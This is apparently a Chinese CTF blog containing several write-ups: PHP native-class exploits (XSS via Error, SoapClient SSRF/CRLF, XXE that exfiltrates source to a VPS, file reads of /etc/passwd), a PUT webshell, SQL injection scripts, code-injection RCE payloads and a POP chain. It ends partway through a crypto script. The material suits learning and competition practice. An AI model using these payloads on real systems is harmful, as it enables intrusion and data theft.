Error(&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;);$b = serialize($a);echo urlencode($b); ?&gt; 发现成功触发xss，存在利用。 而Exception除了可以利用在php7外，还可以利用在php5上，方法一致。 绕过hash比较在php7下，Error是所有PHP内部错误类的基类，我们可以利用其返回性质来进行绕过。 [极客大挑战 2020]Greatphp： 12345678910111213141516171819202122232425&lt;?phperror_reporting(0);class SYCLOVER &#123; public $syc; public $lover; public function __wakeup()&#123; if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) )&#123; if(!preg_match(&quot;/\\&lt;\\?php|\\(|\\)|\\&quot;|\\&#x27;/&quot;, $this-&gt;syc, $match))&#123; eval($this-&gt;syc); &#125; else &#123; die(&quot;Try Hard !!&quot;); &#125; &#125; &#125;&#125;if (isset($_GET[&#x27;great&#x27;]))&#123; unserialize($_GET[&#x27;great&#x27;]);&#125; else &#123; highlight_file(__FILE__);&#125;?&gt; poc： 1234567891011121314151617181920212223242526&lt;?phpclass SYCLOVER &#123; public $syc; public $lover; public function __wakeup()&#123; if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) )&#123; if(!preg_match(&quot;/\\&lt;\\?php|\\(|\\)|\\&quot;|\\&#x27;/&quot;, $this-&gt;syc, $match))&#123; eval($this-&gt;syc); &#125; else &#123; die(&quot;Try Hard !!&quot;); &#125; &#125; &#125;&#125;$cmd=&#x27;/flag&#x27;;$cmd=urlencode(~$cmd);$str = &quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;?&gt;&quot;;$a=new Error($str,1);$b=new Error($str,2);$c = new SYCLOVER();$c-&gt;syc = $a;$c-&gt;lover = $b;echo(urlencode(serialize($c)));?&gt; 用一个简单的短标签和取反绕rce，主要是学习原生类应用。 Exception也一样，php5以上都可利用。 SoapClient这个类一般用于ssrf，这是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的PHP客户端。该迭代器有一个__call()方法，当__call()方法被触发后，它可以发送HTTP和HTTPS请求。 构造规则： 123public SoapClient :: SoapClient(mixed $wsdl [，array $options ])第一个参数是用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式。第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。 我们使用RequestBin进行模拟： 1234567&lt;?php$a = new SoapClient(null,array(&#x27;location&#x27;=&gt;&#x27;http://requestbin.net/r/f30dvgdx&#x27;, &#x27;uri&#x27;=&gt;&#x27;ssrf&#x27;));$b = serialize($a);echo $b;$c = unserialize($b);$c-&gt;a(); // 随便调用对象中不存在的方法, 触发__call方法进行ssrf?&gt; 执行代码，发现成功触发ssrf。但是，由于它仅限于HTTP/HTTPS协议，所以用处不是很大。而如果这里HTTP头部还存在CRLF漏洞的话，但我们则可以通过SSRF+CRLF，插入任意的HTTP头。 像这样： 12345678&lt;?php$target = &#x27;http://requestbin.net/r/f30dvgdx&#x27;;$a = new SoapClient(null,array(&#x27;location&#x27; =&gt; $target, &#x27;user_agent&#x27; =&gt; &quot;WHOAMI\\r\\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4&quot;, &#x27;uri&#x27; =&gt; &#x27;test&#x27;));$b = serialize($a);echo $b;$c = unserialize($b);$c-&gt;a(); // 随便调用对象中不存在的方法, 触发__call方法进行ssrf?&gt; 我们的自定义cookie就被插入进http头中了。 SimpleXMLElement这个类用于解析XML文档中的元素，我们可以参考php手册对其的定义： 根据手册，当data_is_url为true时，我们可以实现远程xml载入，而data参数用来设置自己的payload的url地址，从而实现xxe。 我们来看一题的代码： 1234567891011121314151617181920212223242526272829303132333435&lt;?php class calc&#123; function __construct__()&#123; calc(); &#125; function calc($args1,$method,$args2)&#123; $args1=intval($args1); $args2=intval($args2); switch ($method) &#123; case &#x27;a&#x27;: $method=&quot;+&quot;; break; case &#x27;b&#x27;: $method=&quot;-&quot;; break; case &#x27;c&#x27;: $method=&quot;*&quot;; break; case &#x27;d&#x27;: $method=&quot;/&quot;; break; default: die(&quot;invalid input&quot;); &#125; $Expression=$args1.$method.$args2; eval(&quot;\\$r=$Expression;&quot;); die(&quot;Calculation results:&quot;.$r); &#125;&#125;?&gt; 我们发现module为调用的类，args为类的构造方法的参数，那么在这里我们就可以构造xxe读取源码。 首先在自己的vps上构建三个文件，分别是mrl64.xml、send.xml以及send.php。 mrl64.xml： 1234567&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM &quot;http://ip/send.xml&quot;&gt;%remote;%all;%send;]&gt; send.xml： 12&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot;&gt;&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://1.xxx.xxx.47/send.php?file=%file;&#x27;&gt;&quot;&gt; send.php： 123&lt;?php file_put_contents(&quot;result.txt&quot;, $_GET[&#x27;file&#x27;]) ;?&gt; 接着我们构建payload： 1?module=SimpleXMLElement&amp;args[]=http://ip/mrl64.xml&amp;args[]=2&amp;args[]=true 我们就会发现源码已经被写入result.txt中了。 ZipArchiveZipArchive类可以对文件进行压缩与解压缩处理，之前题目出现的利用主要是用来删除waf文件的。如果设置flags参数的值为ZipArchive::OVERWRITE的话，可以把指定文件删除。 由于没有找到对应题目的复现环境以及docker，所以就大概讲一下题目思路吧。 首先是源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273&lt;?phphighlight_file(__FILE__);error_reporting(0);include(&#x27;shell.php&#x27;);class Game&#123; public $username; public $password; public $choice; public $register; public $file; public $filename; public $content; public function __construct() &#123; $this-&gt;username=&#x27;user&#x27;; $this-&gt;password=&#x27;user&#x27;; &#125; public function __wakeup()&#123; if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;)&#123; $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content); &#125;else&#123; $this-&gt;choice = new register(); &#125; &#125; public function __destruct() &#123; $this-&gt;choice-&gt;checking($this-&gt;username,$this-&gt;password); &#125;&#125;class login&#123; public $file; public $filename; public $content; public function __construct($file,$filename,$content) &#123; $this-&gt;file=$file; $this-&gt;filename=$filename; $this-&gt;content=$content; &#125; public function checking($username,$password) &#123; if($username===&#x27;admin&#x27;&amp;&amp;$password===&#x27;admin&#x27;)&#123; $this-&gt;file-&gt;open($this-&gt;filename,$this-&gt;content); die(&#x27;login success you can to open shell file!&#x27;); &#125; &#125;&#125;class register&#123; public function checking($username,$password) &#123; if($username===&#x27;admin&#x27;&amp;&amp;$password===&#x27;admin&#x27;)&#123; die(&#x27;success register admin&#x27;); &#125;else&#123; die(&#x27;please register admin &#x27;); &#125; &#125;&#125;class Open&#123; function open($filename, $content)&#123; if(!file_get_contents(&#x27;waf.txt&#x27;))&#123; shell($content); &#125;else&#123; echo file_get_contents($filename.&quot;.php&quot;); &#125; &#125;&#125;if($_GET[&#x27;a&#x27;]!==$_GET[&#x27;b&#x27;]&amp;&amp;(md5($_GET[&#x27;a&#x27;]) === md5($_GET[&#x27;b&#x27;])) &amp;&amp; (sha1($_GET[&#x27;a&#x27;])=== sha1($_GET[&#x27;b&#x27;])))&#123; @unserialize(base64_decode($_POST[&#x27;unser&#x27;]));&#125; 我们重点关注在Open类上，这里有个读取文件，只有读取waf.txt失败才可以进行rce。而观察代码，我们发现Game类中的$content可以进行设置，因此我们构造poc： 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpclass Game&#123; public $username = &quot;admin&quot;; public $password = &quot;admin&quot;; public $choice; public $register = &quot;admin&quot;; public $file = new ZipArchive(); public $filename = &quot;waf.txt&quot;; public $content = ZipArchive::OVERWRITE; public function __construct() &#123; $this-&gt;username=&#x27;user&#x27;; $this-&gt;password=&#x27;user&#x27;; &#125; public function __wakeup()&#123; if(md5($this-&gt;register)===&quot;21232f297a57a5a743894a0e4a801fc3&quot;)&#123; // admin $this-&gt;choice=new login($this-&gt;file,$this-&gt;filename,$this-&gt;content); &#125;else&#123; $this-&gt;choice = new register(); &#125; &#125; public function __destruct() &#123; $this-&gt;choice-&gt;checking($this-&gt;username,$this-&gt;password); &#125;&#125;class login&#123; public $file; public $filename; public $content;&#125;class Open&#123; function open($filename, $content)&#123; &#125;&#125;$poc = new Game();echo base64_encode(serialize($poc)); 其他参数的设置是别的考点，我们这里只关注原生类，这样就可以删除waf.txt文件了。 文件遍历DirectoryIterator/FilesystemIterator这两个类十分相似，我们只需要构造个很简单的poc就可以读取文件了： 123&lt;?php$dir=new DirectoryIterator(&quot;/&quot;);echo $dir; 不过这样只能读取根目录下的第一个文件名，我们可以通过遍历读取根目录下所有文件名： 123456&lt;?php$dir=new DirectoryIterator(&quot;/&quot;);foreach($dir as $f)&#123; echo($f.&#x27;&lt;br&gt;&#x27;); //echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);&#125; 配合glob协议进行匹配做到查找我们想要的文件： 123&lt;?php$dir=new DirectoryIterator(&quot;glob:///*php*&quot;);echo $dir; GlobIterator这个类nisa复现的时候用过，其实也差不多，不过比较特殊的是他自己就可以进行匹配，不需要通过glob伪协议： 123&lt;?php$dir=new GlobIterator(&quot;/*php*&quot;);echo $dir; 绕过open_basedir与glob协议结合读取配合遍历即可绕过，测试代码也非常简单： 1234567&lt;?php$dir = $_GET[&#x27;whoami&#x27;];$a = new DirectoryIterator($dir);foreach($a as $f)&#123; echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);// 不加__toString()也可,因为echo可以自动调用&#125;?&gt; payload： 1?whoami=glob:///* 同样由于GlobIterator类的特殊性，使用该类遍历时就不需要配合glob协议了。 SplFileObject能遍历自然要读取，SplFileInfo类为单个文件的信息提供了一个高级的面向对象的接口，可以用于对文件内容的遍历、查找、操作。nisa的题目中进行文件读取操作用的就是这个类。 读取第一行： 123&lt;?php$context = new SplFileObject(&#x27;/etc/passwd&#x27;);echo $context; 遍历文件： 12345&lt;?php$context = new SplFileObject(&#x27;/etc/passwd&#x27;);foreach($context as $f)&#123; echo($f);&#125; 和遍历文件的类用法相似，也是比较简单的。 ReflectionMethod这个类报告了一个方法的有关信息，最重要的是可以导出或提取关于类、方法、属性、参数等的详细信息，包括注释： 123456789101112131415161718ReflectionMethod::__construct — ReflectionMethod 的构造函数 ReflectionMethod::export — 输出一个回调方法 ReflectionMethod::getClosure — 返回一个动态建立的方法调用接口，译者注：可以使用这个返回值直接调用非公开方法。 ReflectionMethod::getDeclaringClass — 获取被反射的方法所在类的反射实例 ReflectionMethod::getModifiers — 获取方法的修饰符 ReflectionMethod::getPrototype — 返回方法原型 (如果存在) ReflectionMethod::invoke — Invoke ReflectionMethod::invokeArgs — 带参数执行 ReflectionMethod::isAbstract — 判断方法是否是抽象方法 ReflectionMethod::isConstructor — 判断方法是否是构造方法 ReflectionMethod::isDestructor — 判断方法是否是析构方法 ReflectionMethod::isFinal — 判断方法是否定义 final ReflectionMethod::isPrivate — 判断方法是否是私有方法 ReflectionMethod::isProtected — 判断方法是否是保护方法 (protected) ReflectionMethod::isPublic — 判断方法是否是公开方法 ReflectionMethod::isStatic — 判断方法是否是静态方法 ReflectionMethod::setAccessible — 设置方法是否访问 ReflectionMethod::__toString — 返回反射方法对象的字符串表达 我们用getDocComment()方法举例，获取注释内容： 1234567891011121314&lt;?phperror_reporting(0);class Flag&#123; /** * mrl64&#123;flag_is_here&#125; */ function read()&#123; return 1234; &#125;&#125;$a = new ReflectionMethod(&#x27;Flag&#x27;,&#x27;read&#x27;);var_dump($a-&gt;getDocComment()); 发现回显： 123string(39) &quot;/** * mrl64&#123;flag_is_here&#125; */&quot; 总结本来是只想着学下文件操作类的部分，没想到已经出现了这么多不同的考法，还是得多做总结，利用在之后的题目中。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -php","slug":"web-php","permalink":"http://example.com/tags/web-php/"}]},{"title":"【NSSRound#1 Basic】赛后复现","slug":"【NSSRound-1-Basic】赛后复现","date":"2022-04-03T05:30:05.000Z","updated":"2022-04-03T08:51:01.829Z","comments":true,"path":"2022/04/03/【NSSRound-1-Basic】赛后复现/","link":"","permalink":"http://example.com/2022/04/03/%E3%80%90NSSRound-1-Basic%E3%80%91%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/","excerpt":"前言 睡过了忘记了，起来都快结束了，就简单做了下取证还没做完（，赶紧来复现下。","text":"前言 睡过了忘记了，起来都快结束了，就简单做了下取证还没做完（，赶紧来复现下。 basic_check这题出的好，考察了http协议的知识，我都忘光了都，也提醒自己基础一定要扎实。 进入网页约等于啥都没有： 1&lt;?php highlight_file(__FILE__);// Welcome to NSSCTF Round#1 Basic, have fun. 这里要用到OPTIONS请求方法查看允许的请求方式： 发现PUT方法，那么就简单了，我们只需要PUT进一个一句马即可： 获取webshell： 根目录读取flag即可。 sql_by_sql进去发现注册登录，盲猜二次注入，我们先随便注册然后登录，发现可以修改密码，我们在修改密码的页面的源码中发现了sql语句： 1update user set password=&#x27;%s&#x27; where username=&#x27;%s&#x27;; 确实是二次注入，我们只需要注册一个账户名为admin&#39;--+的用户，结合sql语句就可以做到改admin的密码。 因此更改admin密码登录，登陆后发现可以查询用户id，这里根据用户是否存在存在一个布尔盲注。 根据fuzz判断这里不是mysql，应该是sqlite注入，exp： 12345678910111213141516171819202122232425262728import requestsimport stringimport jsonstrs = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@_.,-&#123;&#125; &quot;url = &quot;http://1.14.71.254:28467/query&quot;s = requests.session()headers = &#123;&#x27;Cookie&#x27;: &#x27;session=eyJyb2xlIjoxLCJ1c2VybmFtZSI6ImFkbWluIn0.YklOVg.Pz554uNEiaxxBCpP4pm7-G8iucg&#x27;&#125;if __name__ == &quot;__main__&quot;: name = &#x27;&#x27; for i in range(0,100): char = &#x27;&#x27; for j in strs: #表+字段 #payload = &quot;1 and substr((select sql from sqlite_master limit 1,1),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;&quot;.format(i, j) #数据 payload = &quot;1 and substr((select flag from flag limit 0,1),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;&quot;.format(i, j) data = &#123;&quot;id&quot;: payload&#125; r = s.post(url=url, data=data, headers=headers) #print(r.text) if &quot;exist&quot; in r.text: name += j print(j, end=&#x27;&#x27;) char = j break if char == &#x27;%&#x27;: break 这题主要是初识sqlite了，不过大体上和mysql也是相差不大，主要是一些函数的区别吧。 cut_into_thirds取证题，其实难度不高，但是因为我的工具没法装mimikatz插件就很淦，后来用了另一个工具把第三部分密码爆出来的。 整体思路就是filescan找到LookAtMe.zip，解压得到第一部分： 1part1:3930653363343839 接着pslist查运行程序，发现LookAtme.exe，dump下来strings找到第二部分： 1part2:GRRGGYJNGQ4GKMBNMJRTONI= 最后一个部分藏在ctf用户的密码中，没有插件就用Passware Kit Forensic一把嗦，找到第三部分： 1part3:MTEwOTFmNWI3ZTNh 分别解码base16、base32、base64即可。","categories":[{"name":"write up","slug":"write-up","permalink":"http://example.com/categories/write-up/"}],"tags":[{"name":"-ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]},{"title":"【NISACTF】write up","slug":"【NISACTF】write-up","date":"2022-03-27T09:47:06.000Z","updated":"2022-03-30T15:21:34.654Z","comments":true,"path":"2022/03/27/【NISACTF】write-up/","link":"","permalink":"http://example.com/2022/03/27/%E3%80%90NISACTF%E3%80%91write-up/","excerpt":"前言 福师大的校赛，有些很简单的题就不写了，这个wp主要是记录下学习到的东西，也不算wp其实，因为有些题是后面复现的。","text":"前言 福师大的校赛，有些很简单的题就不写了，这个wp主要是记录下学习到的东西，也不算wp其实，因为有些题是后面复现的。 webcheckin 这题看代码颜色都能感觉到不对，使用了特殊的编码，因此要进行URL编码来进行GET传参，payload： 1?ahahahaha=jitanglailo&amp;%E2%80%AE%E2%81%A6L3H%E2%81%A9%E2%81%A6cuishiyuan=%E2%80%AE%E2%81%A6Ugeiwo%E2%81%A9%E2%81%A6N1SACTF level-up五层关卡，前四层都是做过的，主要写下第五层，源码： 1234567891011121314&lt;?php//sorry , here is true last level//^_^error_reporting(0);include &quot;str.php&quot;;$a = $_GET[&#x27;a&#x27;];$b = $_GET[&#x27;b&#x27;];if(preg_match(&#x27;/^[a-z0-9_]*$/isD&#x27;,$a))&#123; show_source(__FILE__);&#125;else&#123; $a(&#x27;&#x27;,$b);&#125; 这里的考点是匿名函数的使用，主要是看到$a(&#39;&#39;,$b);这个代码，那么我们可以使用create_function()匿名函数代码注入，这个函数填入两个参数，前一个是函数名，后一个是函数内容，因此可以执行。payload： 1?a=%5ccreate_function&amp;b=2;&#125;system(&#x27;cat /flag&#x27;);/* bingdundun~这题看了wp才发现当初几乎都做出来了，就差一点，有点可惜。 进入网页发现可以点击upload，点击后提示可以上传图片或压缩包，并且发现url有意思文件包含： 1?bingdundun=upload 上传文件测试发现应该是白名单，因此没办法上传配置文件和php文件，而文件包含也过滤了php://、data://等伪协议，但是发现phar://没有被过滤，结合可以上传压缩包，这题应该就是考phar压缩包伪协议的包含了。 那么我们写一个一句马并打包上传，获取到文件名，然后用phar伪协议构建payload： 1?bingdundun=phar://579eb57ccc73842341f80c475b04738b.zip/shell 蚁剑连接，根目录获取flag。我当时包含的时候最后写的是shell.php而不是shell导致没包含成功，我好气啊。 babyupload这题当时都没看，赛后补票了属于是。 源码提示/source，那就去查看下，审计python代码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485from flask import Flask, request, redirect, g, send_from_directoryimport sqlite3import osimport uuidapp = Flask(__name__)SCHEMA = &quot;&quot;&quot;CREATE TABLE files (id text primary key,path text);&quot;&quot;&quot;def db(): g_db = getattr(g, &#x27;_database&#x27;, None) if g_db is None: g_db = g._database = sqlite3.connect(&quot;database.db&quot;) return g_db@app.before_first_requestdef setup(): os.remove(&quot;database.db&quot;) cur = db().cursor() cur.executescript(SCHEMA)@app.route(&#x27;/&#x27;)def hello_world(): return &quot;&quot;&quot;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;form action=&quot;/upload&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; Select image to upload: &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;Upload File&quot; name=&quot;submit&quot;&gt;&lt;/form&gt;&lt;!-- /source --&gt;&lt;/body&gt;&lt;/html&gt;&quot;&quot;&quot;@app.route(&#x27;/source&#x27;)def source(): return send_from_directory(directory=&quot;/var/www/html/&quot;, path=&quot;www.zip&quot;, as_attachment=True)@app.route(&#x27;/upload&#x27;, methods=[&#x27;POST&#x27;])def upload(): if &#x27;file&#x27; not in request.files: return redirect(&#x27;/&#x27;) file = request.files[&#x27;file&#x27;] if &quot;.&quot; in file.filename: return &quot;Bad filename!&quot;, 403 conn = db() cur = conn.cursor() uid = uuid.uuid4().hex try: cur.execute(&quot;insert into files (id, path) values (?, ?)&quot;, (uid, file.filename,)) except sqlite3.IntegrityError: return &quot;Duplicate file&quot; conn.commit() file.save(&#x27;uploads/&#x27; + file.filename) return redirect(&#x27;/file/&#x27; + uid)@app.route(&#x27;/file/&lt;id&gt;&#x27;)def file(id): conn = db() cur = conn.cursor() cur.execute(&quot;select path from files where id=?&quot;, (id,)) res = cur.fetchone() if res is None: return &quot;File not found&quot;, 404 # print(res[0]) with open(os.path.join(&quot;uploads/&quot;, res[0]), &quot;r&quot;) as f: return f.read()if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, port=80) 发现是路由，重点检查/upload和file，如果文件名中含有.，则返回Bad filename!，然后保存文件并且返回给/file路由。而file路由中有一段打开文件读取的代码，这里存在漏洞，我们更改文件名为//flag，发包后回显文件名，访问对应文件即可获得flag： middlerce审计代码： 1234567891011121314151617&lt;?phpinclude &quot;check.php&quot;;if (isset($_REQUEST[&#x27;letter&#x27;]))&#123; $txw4ever = $_REQUEST[&#x27;letter&#x27;]; if (preg_match(&#x27;/^.*([\\w]|\\^|\\*|\\(|\\~|\\`|\\?|\\/| |\\||\\&amp;|!|\\&lt;|\\&gt;|\\&#123;|\\x09|\\x0a|\\[).*$/m&#x27;,$txw4ever))&#123; die(&quot;再加把油喔&quot;); &#125; else&#123; $command = json_decode($txw4ever,true)[&#x27;cmd&#x27;]; checkdata($command); @eval($command); &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 过滤了一片字符，还有二次check，看着都麻了。首先是我们可见的部分，这部分是参考了之前的一道赛题，但是由于%0A也没了，所以就是用PCRE回溯的方法绕过preg_match()。然后这里有个巨坑的点，我之前一直发送字符a一直不行，后来发现a也是被过滤的的…… 然后是第二层，打比赛的时候是要猜的，不过复现时候wp也给出了黑名单： 1/\\^|\\||\\~|assert|print|include|require|\\(|echo|flag|data|php|glob|sys|phpinfo|POST|GET|REQUEST|exec|pcntl|popen|proc|socket|link|passthru|file|posix|ftp|\\_|disk|tcp|cat|tac/i 防了很多方式，不过*没被过滤所以可以构造模糊查询，反引号没被过滤可以构造命令执行。echo被过滤了，不过符号没被过滤，因此构造短标签进行绕过，payload： 123456import requestspayload = &#x27;&#123;&quot;cmd&quot;:&quot;?&gt;&lt;?= `sort /f*`?&gt;&quot;,&quot;$&quot;:&quot;&#x27; + &quot;$&quot;*(1000000) + &#x27;&quot;&#125;&#x27;res = requests.post(&quot;http://1.14.71.254:28118/&quot;, data=&#123;&quot;letter&quot;:payload&#125;)print(res.text) 得到flag。 hardsql这题描述有直接给语句： 12$password=$_POST[&#x27;passwd&#x27;];$sql=&quot;SELECT passwd FROM users WHERE username=&#x27;bilala&#x27; and passwd=&#x27;$password&#x27;;&quot;; 其实看到这个语句我就想起之前hgame那题的like注入，最主要列名给你了，所以应该是类似的，所以直接把脚本改一下拿来用，exp: 123456789101112131415161718192021222324import requestsimport stringstrs = string.printableurl = &quot;http://1.14.71.254:28030/login.php&quot;if __name__ == &quot;__main__&quot;: name = &#x27;&#x27; for i in range(0,100): char = &#x27;&#x27; for j in strs: payload = &quot;1&#x27;/**/or/**/passwd/**/like/**/&#x27;&#123;&#125;%&#x27;#%&quot;.format(name+j) data = &#123; &quot;username&quot;: &quot;bilala&quot;, &quot;passwd&quot;: payload &#125; r = requests.post(url=url, data=data) if &quot;wrong&quot; in r.text: name += j print(j, end=&#x27;&#x27;) char = j break if char == &#x27;%&#x27;: break 跑出密码： 1b2f2d15b3ae082ca29697d8dcd420fd7 登录后发现是源码，审计一下重点部分： 1234567891011if ($row[&#x27;passwd&#x27;] === $password) &#123; if($password == &#x27;b2f2d15b3ae082ca29697d8dcd420fd7&#x27;)&#123; show_source(__FILE__); die; &#125; else&#123; die($FLAG); &#125;&#125; else &#123; alertMes(&quot;wrong password&quot;,&#x27;index.php&#x27;);&#125; 这里是第五空间的一题改的，没做过这题所以当时没做出来。这里的考点是quine注入，这波学习了。 具体原理可以参考这几篇文章：SQLi Quine第五空间 2021——yet_another_mysql_injection 核心思想就是让sql语句执行的结果等于sql语句本身，来绕过这个验证。直接用上面文章的payload改一下就好了，由于char()被过滤，可以通过chr()或0x替代。 payload： 1username=bilala&amp;passwd=&#x27;UNION/**/SELECT/**/REPLACE(REPLACE(&#x27;&quot;UNION/**/SELECT/**/REPLACE(REPLACE(&quot;?&quot;,CHR(34),CHR(39)),CHR(63),&quot;?&quot;)/**/AS/**/a#&#x27;,CHR(34),CHR(39)),CHR(63),&#x27;&quot;UNION/**/SELECT/**/REPLACE(REPLACE(&quot;?&quot;,CHR(34),CHR(39)),CHR(63),&quot;?&quot;)/**/AS/**/a#&#x27;)/**/AS/**/a# 后来我也找到一个exp可以生成这类payload： 123456789101112def quine(data, debug=True): if debug: print(data) data = data.replace(&#x27;!!&#x27;,&quot;REPLACE(REPLACE(!!,CHAR(34),CHAR(39)),CHAR(33),!!)&quot;) blob = data.replace(&#x27;!!&#x27;,&#x27;&quot;!&quot;&#x27;).replace(&quot;&#x27;&quot;,&#x27;&quot;&#x27;) data = data.replace(&#x27;!!&#x27;,&quot;&#x27;&quot;+blob+&quot;&#x27;&quot;) if debug: print(data) return data&quot;&quot;&quot;!!填充的东西执行完之后和data一样&quot;&quot;&quot;data=&quot;&#x27;/**/union/**/select(!!)#&quot;quine(data) join-us登录页面中存在sql注入，但是这个waf十分之狠，不过or也被过滤以及题目的名字都给我们提示，可能是无列名注入。 但是我们首先需要知道库名，而as被过滤了，这就导致我们无法通过database()的方式获取库名，我当时也卡在这了。看了wp发现这里要利用报错来进行爆库，payload： 1-1&#x27; || (select*from aa)# 得到回显： 1Table &#x27;sqlsql.aa&#x27; doesn&#x27;t exist 库名为sqlsql 接着用extractvalue报错注入获取表名，payload： 12-1&#x27; || extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema like 0x73716c73716c)))#//过滤的是or ，并非or 表名为Fal_flag和output。坑爹的是flag在output中。 这里由于column被过滤，因此无法查询列名，使用join无列名注入查列名，payload: 1-1&#x27; || extractvalue(1,concat(0x7e,(select*from (select*from output a join output b)c)))# 列名为data 最后报错注入配合mid截断得到flag，payload： 123-1&#x27; || extractvalue(1,concat(0x7e,mid((select data from output),1,20)))#-1&#x27; || extractvalue(1,concat(0x7e,mid((select data from output),21,40)))# babyserialize下个月恶补要的pop链，这题难度不是很高，刚好拿来练手用。 审计源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081 &lt;?phpinclude &quot;waf.php&quot;;class NISA&#123; public $fun=&quot;show_me_flag&quot;; public $txw4ever; public function __wakeup() &#123; if($this-&gt;fun==&quot;show_me_flag&quot;)&#123; hint(); &#125; &#125; function __call($from,$val)&#123; $this-&gt;fun=$val[0]; &#125; public function __toString() &#123; echo $this-&gt;fun; return &quot; &quot;; &#125; public function __invoke() &#123; checkcheck($this-&gt;txw4ever); @eval($this-&gt;txw4ever); &#125;&#125;class TianXiWei&#123; public $ext; public $x; public function __wakeup() &#123; $this-&gt;ext-&gt;nisa($this-&gt;x); &#125;&#125;class Ilovetxw&#123; public $huang; public $su; public function __call($fun1,$arg)&#123; $this-&gt;huang-&gt;fun=$arg[0]; &#125; public function __toString()&#123; $bb = $this-&gt;su; return $bb(); &#125;&#125;class four&#123; public $a=&quot;TXW4EVER&quot;; private $fun=&#x27;abc&#x27;; public function __set($name, $value) &#123; $this-&gt;$name=$value; if ($this-&gt;fun = &quot;sixsixsix&quot;)&#123; strtolower($this-&gt;a); &#125; &#125;&#125;if(isset($_GET[&#x27;ser&#x27;]))&#123; @unserialize($_GET[&#x27;ser&#x27;]);&#125;else&#123; highlight_file(__FILE__);&#125;//func checkcheck($data)&#123;// if(preg_match(......))&#123;// die(something wrong);// &#125;//&#125;//function hint()&#123;// echo &quot;.......&quot;;// die();//&#125;?&gt; 出口很明显是NISA类中的__invoke()，入口也显然应该选择TianXiWei类中的__wakeup()。接下来就是构造逻辑链条： 1TianXiWei:__wakeup() --&gt; Ilovetxw:__call() --&gt; four:__set() --&gt; Ilovetxw:__toString() --&gt; NISA:__invoke() 由于waf对危险函数的过滤，这里要利用php原生类来读取，用GlobIterator(\\&quot;/f*\\&quot;)来读取文件名，再用SplFileObject(&quot;php://filter/convert.base64-encode/resource=/fllllllaaag&quot;)来读取文件。 exp： 12345678910111213141516171819202122232425262728&lt;?phpclass NISA&#123; public $fun=&quot;mrl64&quot;; public $txw4ever=&quot;echo new SplFileObject(\\&quot;php://filter/convert.base64-encode/resource=/fllllllaaag\\&quot;);&quot;;&#125;class TianXiWei&#123; public $ext; public $x=&quot;sixsixsix&quot;;&#125;class Ilovetxw&#123; public $huang; public $su;&#125;class four&#123; public $a=&quot;TXW4EVER&quot;; private $fun=&#x27;abc&#x27;;&#125;$N1 = new NISA();$I1 = new Ilovetxw();$I1-&gt;su = $N1;$f1 = new four();$f1-&gt;a = $I1;$I2 = new Ilovetxw();$I2-&gt;huang = $f1;$T1 = new TianXiWei();$T1-&gt;ext = $I2;echo urlencode(serialize($T1));?&gt; Cryptorrssaa1给了个exe文件，提示当明文等于明文，又给了个txt文件，里面有一个c的值。有点懵，这是rsa? 后面提示可以python反编译exe文件，发现是cbc加密，并且给了iv，根据明文等于密文，我们进行如下操作： 将IV作为第一组明文输入，这样异或出的就是一组0变量，再将0变量加密后的密文分组作为第二次的明文输入，这样第二组的异或出的仍是一组0变量，这样得到的密文分组和明文分组就是一样的。 得到10组n、e的值，这里就很明显是共解密指数攻击了，exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546//sagefrom gmpy2 import mpzfrom Crypto.Util.number import *def common_private_attack(instance, debug=0, algo=&quot;LLL&quot;): r = len(instance) instance.sort(key=lambda x: x[&#x27;n&#x27;]) M = isqrt(instance[r-1][&#x27;n&#x27;]) # Build up Lattice basis B B = zero_matrix(r+1) B[0,0] = isqrt(instance[r-1][&#x27;n&#x27;]) for i in range(1, r+1): B[0,i] = instance[i-1][&#x27;e&#x27;] B[i,i] = - instance[i-1][&#x27;n&#x27;] if debug: print(&quot;The basis of the lattice we build is:&quot;); print(B) if algo == &quot;LLL&quot;: print(&quot;Performing LLL reduction...&quot;); B = B.LLL(); 